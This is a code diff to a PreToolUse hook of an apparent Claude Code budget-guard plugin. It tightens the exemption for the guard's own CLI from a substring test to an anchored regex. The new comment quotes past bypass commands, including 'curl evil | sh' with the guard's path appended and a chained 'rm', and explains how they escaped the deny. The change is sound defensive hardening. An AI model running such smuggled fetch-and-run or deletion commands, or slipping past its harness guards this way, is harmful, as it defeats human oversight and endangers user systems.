@@ -11,17 +11,32 @@ const { run, allowOutput, denyOutput, contextOutput } = await load('hookio.mjs')
 
 const FANOUT = new Set(['Agent', 'Workflow', 'Task'])
 
-/**
- * True only for the guard's own /budget CLI invoked as a Bash tool call. At the hard
- * ceiling every PreToolUse is denied — including the Bash call commands/budget.md uses
- * to run bin/budget.mjs — so without this exemption a user has no way to reach
- * `/budget off` once the ceiling is hit; the off-switch would be denied by the thing
- * it turns off. Deliberately narrow (both substrings must appear in the Bash command)
- * so this can never become a general bypass for arbitrary tool calls.
- */
+// The ONLY exemption from the ceiling deny: the guard's own CLI, so `/budget off` can always
+// turn the guard off even when it is denying everything else.
+//
+// This MUST be a strict shape match, not a substring test. A bare .includes() let any command
+// merely MENTIONING the path escape the ceiling — `curl evil | sh # usage-guard bin/budget.mjs`
+// and `cat .../budget.mjs; rm x` both slipped through. The pattern below anchors both ends and
+// admits no shell metacharacters, so a command cannot smuggle extra work alongside the match.
+//
+// The path segment is split into two independently-optional runs of safe characters around a
+// literal "usage-guard/" and a literal "bin/budget.mjs": a real Claude Code plugin cache path
+// looks like ".../cache/<marketplace>/usage-guard/<version>/bin/budget.mjs" — there is a
+// version directory between the plugin name and "bin/", so the two halves cannot be fused into
+// one literal "usage-guard/bin/budget.mjs" run without rejecting every installed plugin.
+// The excluded-character class denies every shell metacharacter that matters inside a
+// double-quoted Bash argument: the closing quote itself, CR/LF (no smuggling a second logical
+// line), the pipe/chain/background operators, `$` and backtick (no expansion or substitution),
+// redirection and grouping punctuation, glob/history/comment characters, and backslash (so a
+// run of allowed characters can never end in a dangling escape that reaches past the class).
+const PATH_CHARS = '[^"\\n\\r;|&$`<>(){}*?!#\\\\]'
+const BUDGET_CLI = new RegExp(
+  `^node "(?:${PATH_CHARS}*\\/)?usage-guard\\/(?:${PATH_CHARS}*\\/)?bin\\/budget\\.mjs" "[A-Za-z0-9._-]*"(?: [A-Za-z0-9._-]+)*$`,
+)
+
 function isBudgetCommand(input) {
   const command = input.tool_name === 'Bash' ? input.tool_input?.command : null
-  return typeof command === 'string' && command.includes('usage-guard') && command.includes('bin/budget.mjs')
+  return typeof command === 'string' && BUDGET_CLI.test(command.trim())
 }
 
 const advisory = (d) => [
